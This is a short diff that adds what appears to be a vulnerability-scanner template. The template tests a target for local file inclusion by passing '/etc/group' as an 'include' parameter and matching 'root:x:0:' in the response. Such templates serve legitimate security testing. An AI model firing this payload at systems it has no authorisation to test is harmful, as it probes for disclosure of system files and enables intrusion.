@@ -1,0 +1,20 @@
+id: lfi4-49
+name: 'System file /etc/group via include'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads /etc/group via include'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      include:
+        - '/etc/group'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:'
